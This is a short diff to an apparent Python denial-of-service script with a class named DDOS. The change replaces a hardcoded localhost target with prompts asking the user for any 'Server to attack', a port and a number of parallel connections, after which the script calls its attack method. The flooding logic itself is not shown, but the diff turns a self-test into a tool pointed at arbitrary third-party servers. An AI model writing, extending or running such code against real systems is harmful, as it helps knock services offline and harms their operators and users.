@@ -52,9 +52,9 @@ class DDOS:
 if __name__ == "__main__":
 
     # DDOS Self
-    tgt = '127.0.0.1'
-    port = 80
-    thread_num = 10
+    tgt = input('Enter Server to attack: ')
+    port = int(input('Enter Port to attack: '))
+    thread_num = int(input('How many parallel connectionsn to make: '))
 
     ddos = DDOS(tgt, port, thread_num)
     ddos.attack()
